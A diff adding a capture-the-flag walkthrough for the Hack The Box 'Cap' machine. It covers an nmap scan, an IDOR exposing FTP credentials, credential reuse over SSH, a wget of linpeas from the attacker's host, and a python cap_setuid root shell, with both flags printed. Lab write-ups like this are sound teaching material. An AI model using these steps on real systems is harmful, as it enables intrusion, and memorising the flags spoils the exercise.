@@ -1,0 +1,51 @@
+Machine=Cap | Creator=InfoSecJack
+
+Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.
+
+
+Questions
+How many TCP ports are open?
+    'nmap --top-ports 1000 10.10.10.245' was able to get me this info.
+    [3]
+
+After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?
+    I ran GoBuster to find all the directories and found /data which had ids underneath it.
+    [data]
+
+Are you able to get to other users' scans?
+    id=0 was able to show a different scan.
+    [yes]
+
+What is the ID of the PCAP file that contains sensative data?
+    Above as shown was
+    [0]
+
+Which application layer protocol in the pcap file can the sensetive data be found in?\
+    ftp which clearly shows credentials in plaintext.
+    [ftp]
+
+We've managed to collect nathan's FTP password. On what other service does this password work?
+    ssh is also open so:
+    [ssh]
+
+Submit the flag located in the nathan user's home directory.
+    cat user.txt:
+    [bbc8a0d22db0d6a09bc703792de50db3]
+
+What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
+    Using LinPeas.sh, we would be able to deduce if there is the capabilty to escalate. 
+    To get it there, I used apache2 via 'sudo systemctl apache2 start' and placing the file in the /var/www/html folder using 'cp' to copy the file over. 
+    From there you can direct to the page and download it via 'wget myip/linpeas.sh'. 
+    ** Change the permissions for the file: 'chmod 700 file'.
+    The result detailed files with capabilities including the result: /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+    [/usr/bin/python3.8]
+
+Submit the flag located in root's home directory.
+    Once within python, I had to perform a number of commands in order to escalate my privileges, they included:
+    | import os          {Importing the os library}
+    | os.setuid(0)       {setting my uid to 0 which is root in this case}
+    | os.system('id')    {confirmation that my uid successfully changed}
+    | os.system('sh')    {Giving myself an interactive shell to work with: This shell believes I am root via my UID}
+    
+    from here it was a matter of redirecting to the root directory and 'cat root.txt'.
+    [30f6c5801b82a386bc5bad8314d22af4]
